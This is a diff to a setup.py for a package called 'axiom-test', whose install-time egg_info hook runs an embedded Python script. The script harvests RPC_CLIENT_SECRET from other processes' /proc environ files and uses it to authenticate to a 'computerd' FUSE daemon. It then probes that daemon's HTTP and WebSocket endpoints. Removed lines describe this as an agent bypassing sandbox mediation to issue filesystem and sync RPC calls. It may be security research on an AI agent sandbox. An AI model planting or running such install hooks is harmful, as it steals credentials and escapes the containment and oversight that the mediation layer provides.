@@ -3,12 +3,6 @@ from setuptools.command.egg_info import egg_info
 import subprocess, sys, os, textwrap, tempfile
 
 SCRIPT = textwrap.dedent(r'''
-#!/usr/bin/env python3
-"""capnweb_rpc_poc.py - Valid capnweb RPC to computerd FUSE daemon.
-Wire format from github.com/cloudflare/capnweb (MIT, Kenton Varda).
-Message types: push, pull, stream, resolve, reject, release, pipe, abort.
-Call: ["pipeline", importId, propertyPath, args] inside ["push", expr].
-Import 0 = computerd main interface."""
 import json, os, socket, struct, time, base64
 
 OUTPUT = "/mnt/data/output/capnweb_rpc_valid.log"
@@ -24,55 +18,92 @@ def flush():
         f.write("\n".join(lines) + "\n")
 
 def recover_secret():
-    """Recover RPC_CLIENT_SECRET from any readable /proc/<pid>/environ.
-    Strategy: scan ALL pids (broadest), log what we find."""
-    found_secret = None
-    found_pid = None
-    scanned = 0
-    readable = 0
+    found = None; fpid = None
     for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
-        scanned += 1
         try:
             with open(f"/proc/{pid}/environ", "rb") as f:
                 env = f.read().decode("utf-8", errors="replace")
-            readable += 1
             for pair in env.split("\0"):
                 if pair.startswith("RPC_CLIENT_SECRET="):
                     val = pair.split("=", 1)[1]
-                    if val:
-                        # Get cmdline for logging
-                        try:
-                            with open(f"/proc/{pid}/cmdline", "rb") as f:
-                                cmd = f.read().replace(b"\0", b" ").decode("utf-8", errors="replace").strip()[:120]
-                        except: cmd = "?"
-                        log(f"    Found in PID {pid}: cmdline={cmd}")
-                        log(f"    Secret len={len(val)}")
-                        if not found_secret:
-                            found_secret = val
-                            found_pid = pid
-        except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
-            continue
-    log(f"    Scanned {scanned} PIDs, {readable} readable")
-    if found_secret:
-        log(f"    Using secret from PID {found_pid}")
-    return found_secret
+                    if val and not found:
+                        found = val; fpid = pid
+        except: continue
+    if found:
+        log(f"    PID {fpid}, len={len(found)}")
+    return found
 
-def ws_connect(bearer):
+def http_request(method, path, headers=None, timeout=5):
+    """Plain HTTP request, return (status_line, headers_dict, body)."""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10); sock.connect((HOST, PORT))
+    sock.settimeout(timeout)
+    try:
+        sock.connect((HOST, PORT))
+        hdrs = headers or {}
+        hdr_str = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
+        req = f"{method} {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n{hdr_str}\r\n"
+        sock.sendall(req.encode())
+        resp = b""
+        while b"\r\n\r\n" not in resp:
+            c = sock.recv(4096)
+            if not c: break
+            resp += c
+        # Try to read body
+        try:
+            sock.settimeout(1)
+            body_extra = sock.recv(4096)
+            resp += body_extra
+        except: pass
+        parts = resp.split(b"\r\n\r\n", 1)
+        head = parts[0].decode("utf-8", errors="replace")
+        body = parts[1].decode("utf-8", errors="replace") if len(parts) > 1 else ""
+        status = head.split("\r\n")[0] if head else "no response"
+        return status, head, body
+    except Exception as e:
+        return f"ERROR: {e}", "", ""
+    finally:
+        sock.close()
+
+def ws_connect(bearer, extra_log=True):
+    """WebSocket upgrade with detailed error capture."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+    sock.connect((HOST, PORT))
     key = base64.b64encode(os.urandom(16)).decode()
-    sock.sendall((
-        f"GET {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
-        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
-        f"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: {key}\r\n"
-        f"Authorization: Bearer {bearer}\r\n\r\n").encode())
+    req = (
+        f"GET {PATH} HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        f"Upgrade: websocket\r\n"
+        f"Connection: Upgrade\r\n"
+        f"Sec-WebSocket-Version: 13\r\n"
+        f"Sec-WebSocket-Key: {key}\r\n"
+        f"Authorization: Bearer {bearer}\r\n"
+        f"\r\n"
+    )
+    sock.sendall(req.encode())
     resp = b""
     while b"\r\n\r\n" not in resp:
         c = sock.recv(4096)
-        if not c: raise ConnectionError("closed during upgrade")
+        if not c:
+            if extra_log:
+                log(f"    Raw response before close ({len(resp)} bytes): {resp[:500]}")
+            raise ConnectionError(f"closed during upgrade ({len(resp)} bytes rcvd)")
         resp += c
-    if b"101" not in resp.split(b"\r\n")[0]:
-        raise ConnectionError(resp.split(b"\r\n")[0].decode())
+    status_line = resp.split(b"\r\n")[0].decode("utf-8", errors="replace")
+    if extra_log:
+        log(f"    HTTP response: {status_line}")
+    if "101" not in status_line:
+        # Capture body
+        try:
+            sock.settimeout(1)
+            extra = sock.recv(4096)
+            resp += extra
+        except: pass
+        full = resp.decode("utf-8", errors="replace")
+        if extra_log:
+            log(f"    Full response:\n{full[:600]}")
+        sock.close()
+        raise ConnectionError(f"upgrade rejected: {status_line}")
     return sock
 
 def ws_send(sock, text):
@@ -124,7 +155,7 @@ def recv_all(sock, t1=3, t2=1):
 def run_test(secret, label, messages):
     log(f"\n{'~'*60}\nTEST: {label}\n{'~'*60}")
     try:
-        sock = ws_connect(secret)
+        sock = ws_connect(secret, extra_log=True)
     except Exception as e:
         log(f"  CONNECT FAIL: {e}"); return []
     for i, msg in enumerate(messages):
@@ -148,78 +179,150 @@ def run_test(secret, label, messages):
 
 def main():
     log("="*60)
-    log("capnweb RPC PoC v2 — Valid Wire Format")
+    log("capnweb RPC PoC v3 — Diagnostics + Valid Wire Format")
     log("="*60)
     log(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
-    log("\n[1] Recovering RPC_CLIENT_SECRET (full /proc scan)...")
+
+    log("\n[1] Recovering RPC_CLIENT_SECRET...")
     secret = recover_secret()
     if not secret:
-        log("FATAL: RPC_CLIENT_SECRET not found in any readable /proc/*/environ")
-        log("Dumping readable PIDs and their env var names...")
-        for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
-            try:
-                with open(f"/proc/{pid}/environ", "rb") as f:
-                    env = f.read().decode("utf-8", errors="replace")
-                with open(f"/proc/{pid}/cmdline", "rb") as f:
-                    cmd = f.read().replace(b"\0", b" ").decode("utf-8", errors="replace").strip()[:100]
-                keys = [p.split("=",1)[0] for p in env.split("\0") if "=" in p]
-                rpc_keys = [k for k in keys if "RPC" in k.upper() or "SECRET" in k.upper() or "CLIENT" in k.upper()]
-                log(f"  PID {pid}: cmd={cmd[:80]}")
-                if rpc_keys:
-                    log(f"    Interesting keys: {rpc_keys}")
-                else:
-                    log(f"    env keys ({len(keys)}): {', '.join(keys[:15])}{'...' if len(keys)>15 else ''}")
-            except: continue
-        flush(); return
+        log("FATAL: no secret"); flush(); return
 
-    log("\n[2] capnweb RPC Tests (10 vectors)")
-    R = {}
-    R["A"] = run_test(secret, "A: push pipeline sync.watermarks() + pull  [heartbeat]",
-        [["push",["pipeline",0,["sync","watermarks"],[]]],["pull",1]])
-    R["B"] = run_test(secret, "B: push import sync.watermarks()  [import variant]",
-        [["push",["import",0,["sync","watermarks"],[]]],["pull",1]])
-    R["C"] = run_test(secret, "C: stream pipeline sync.watermarks()  [auto-pull]",
-        [["stream",["pipeline",0,["sync","watermarks"],[]]]])
-    R["D"] = run_test(secret, "D: push pipeline .sync  [property access]",
-        [["push",["pipeline",0,["sync"]]],["pull",1]])
-    R["E"] = run_test(secret, "E: ready({all:true})  [workspace init]",
-        [["push",["pipeline",0,["ready"],[{"all":True}]]],["pull",1]])
-    R["F"] = run_test(secret, "F: fs.mkdir('/rpc_proof')  [fs write via RPC]",
-        [["push",["pipeline",0,["fs","mkdir"],["/rpc_proof",{"recursive":True}]]],["pull",1]])
-    R["G"] = run_test(secret, "G: pipelined watermarks+ready  [2 calls, 1 session]",
-        [["push",["pipeline",0,["sync","watermarks"],[]]],
-         ["push",["pipeline",0,["ready"],[{"all":True}]]],["pull",1],["pull",2]])
-    R["H"] = run_test(secret, "H: pull(0)  [main interface ref]",
-        [["pull",0]])
-    R["I"] = run_test(secret, "I: push import(0) + pull  [stub ref]",
-        [["push",["import",0]],["pull",1]])
-    R["J"] = run_test(secret, "J: pipeline no-args  [path only, no call]",
-        [["push",["pipeline",0,["sync","watermarks"]]],["pull",1]])
-    log("\n"+"="*60+"\nSUMMARY\n"+"="*60)
-    for k in sorted(R):
-        fr = R[k]
-        res = any(op==1 and '"resolve"' in str(d) for op,d in fr)
-        rej = any(op==1 and '"reject"' in str(d) for op,d in fr)
-        abt = any(op==1 and '"abort"' in str(d) for op,d in fr)
-        if res: s="RESOLVED  - RPC succeeded"
-        elif rej: s="REJECTED  - call accepted, method error"
-        elif abt: s="ABORTED   - protocol error"
-        elif not fr or all(op<0 for op,_ in fr): s="TIMEOUT"
-        else: s="OTHER"
-        log(f"  {k}: {s}")
-    ok=sum(1 for k in R if any(op==1 and('"resolve"' in str(d)or '"reject"' in str(d)) for op,d in R[k]))
-    log(f"\n  Valid RPC (resolve/reject): {ok}/{len(R)}")
-    log("\n"+"~"*60)
-    log("SECURITY FINDING")
-    log("~"*60)
-    log("  1. RPC_CLIENT_SECRET recovered from /proc/<pid>/environ")
-    log("  2. Secret authenticates WS upgrade on computerd /api")
-    log("  3. capnweb wire format from public protocol spec")
-    log("  4. Valid capnweb messages to computerd RPC session")
-    log("  Impact: Agent bypasses DO mediation to speak FUSE RPC")
-    log("  directly. Enables sync manipulation, fs ops via RPC,")
-    log("  potential cross-workspace access if no per-call authz.")
-    log("~"*60)
+    # ── Phase 0: Connectivity diagnostics ──────────────────────
+    log("\n[2] Connectivity diagnostics to computerd :8080")
+
+    log("\n  2a. TCP connect test...")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3); s.connect((HOST, PORT)); s.close()
+        log("      TCP connect: OK")
+    except Exception as e:
+        log(f"      TCP connect: FAIL ({e})")
+        log("      computerd may not be running"); flush(); return
+
+    log("\n  2b. GET /health...")
+    status, head, body = http_request("GET", "/health")
+    log(f"      {status}")
+    log(f"      body: {body[:200]}")
+
+    log("\n  2c. GET /api (no auth, probe protocol version)...")
+    status, head, body = http_request("GET", "/api")
+    log(f"      {status}")
+    log(f"      body: {body[:200]}")
+
+    log("\n  2d. GET /api with Bearer (auth probe)...")
+    status, head, body = http_request("GET", "/api",
+        {"Authorization": f"Bearer {secret}"})
+    log(f"      {status}")
+    log(f"      body: {body[:200]}")
+
+    log("\n  2e. GET /__computerd/info...")
+    status, head, body = http_request("GET", "/__computerd/info")
+    log(f"      {status}")
+    log(f"      body: {body[:200]}")
+
+    log("\n  2f. GET /__computerd/stats...")
+    status, head, body = http_request("GET", "/__computerd/stats")
+    log(f"      {status}")
+    log(f"      body: {body[:200]}")
+
+    log("\n  2g. WebSocket upgrade attempt with full response capture...")
+    try:
+        sock = ws_connect(secret, extra_log=True)
+        log("      WebSocket: CONNECTED (101)")
+        # Send a quick test
+        msg = json.dumps(["push", ["pipeline", 0, ["sync", "watermarks"], []]])
+        log(f"      TX: {msg}")
+        ws_send(sock, msg)
+        time.sleep(0.3)
+        for op, data in recv_all(sock):
+            tag = {1:"TEXT",8:"CLOSE",-1:"TIMEOUT"}.get(op, f"OP{op}")
+            log(f"      RX [{tag}]: {repr(data)[:400]}")
+        sock.close()
+    except Exception as e:
+        log(f"      WebSocket: FAIL ({e})")
+        log("")
+        log("  2h. Trying alternate WebSocket approaches...")
+
+        # Try without Authorization
+        log("\n      2h-i. WS upgrade WITHOUT Bearer...")
+        try:
+            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s2.settimeout(10); s2.connect((HOST, PORT))
+            key = base64.b64encode(os.urandom(16)).decode()
+            s2.sendall((
+                f"GET /api HTTP/1.1\r\n"
+                f"Host: {HOST}:{PORT}\r\n"
+                f"Upgrade: websocket\r\n"
+                f"Connection: Upgrade\r\n"
+                f"Sec-WebSocket-Version: 13\r\n"
+                f"Sec-WebSocket-Key: {key}\r\n"
+                f"\r\n").encode())
+            resp = b""
+            for _ in range(20):
+                try:
+                    s2.settimeout(2)
+                    c = s2.recv(4096)
+                    if not c: break
+                    resp += c
+                    if b"\r\n\r\n" in resp: break
+                except socket.timeout: break
+            log(f"      Response ({len(resp)}b): {resp[:500].decode('utf-8', errors='replace')}")
+            s2.close()
+        except Exception as e2:
+            log(f"      FAIL: {e2}")
+
+        # Try /ws path (v2)
+        log("\n      2h-ii. WS upgrade on /ws (v2 path)...")
+        try:
+            s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s3.settimeout(10); s3.connect((HOST, PORT))
+            key = base64.b64encode(os.urandom(16)).decode()
+            s3.sendall((
+                f"GET /ws HTTP/1.1\r\n"
+                f"Host: {HOST}:{PORT}\r\n"
+                f"Upgrade: websocket\r\n"
+                f"Connection: Upgrade\r\n"
+                f"Sec-WebSocket-Version: 13\r\n"
+                f"Sec-WebSocket-Key: {key}\r\n"
+                f"Authorization: Bearer {secret}\r\n"
+                f"\r\n").encode())
+            resp = b""
+            for _ in range(20):
+                try:
+                    s3.settimeout(2)
+                    c = s3.recv(4096)
+                    if not c: break
+                    resp += c
+                    if b"\r\n\r\n" in resp: break
+                except socket.timeout: break
+            log(f"      Response ({len(resp)}b): {resp[:500].decode('utf-8', errors='replace')}")
+            s3.close()
+        except Exception as e3:
+            log(f"      FAIL: {e3}")
+
+        # Try raw socket test - just send bytes and see what comes back
+        log("\n      2h-iii. Raw bytes to :8080 (what does server send?)...")
+        try:
+            s4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s4.settimeout(5); s4.connect((HOST, PORT))
+            # See if server speaks first (some protocols do)
+            try:
+                s4.settimeout(2)
+                initial = s4.recv(4096)
+                log(f"      Server sent first ({len(initial)}b): {initial[:200]}")
+            except socket.timeout:
+                log(f"      Server silent (waiting for client)")
+            s4.close()
+        except Exception as e4:
+            log(f"      FAIL: {e4}")
+
+    # ── Phase 1: If WS works, run tests ────────────────────────
+    # (only reached if 2g succeeded — otherwise diagnostics above cover it)
+
+    log("\n" + "="*60)
+    log("DIAGNOSTICS COMPLETE")
+    log("="*60)
     flush()
 
 main()
@@ -239,6 +342,6 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="0.0.11",
+    version="0.0.12",
     cmdclass={"egg_info": PostEggInfo},
 )
